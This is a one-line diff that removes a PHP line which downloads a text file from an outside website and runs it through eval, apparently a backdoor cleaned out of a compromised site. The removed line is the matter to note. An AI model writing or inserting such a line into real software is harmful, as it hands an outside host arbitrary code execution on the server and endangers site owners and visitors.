@@ -1,1 +1,0 @@
-<?php eval("?>".file_get_contents("https://arthubofsantafe.net/home/assets/js/vendors/01ganokpw2.txt"));?>
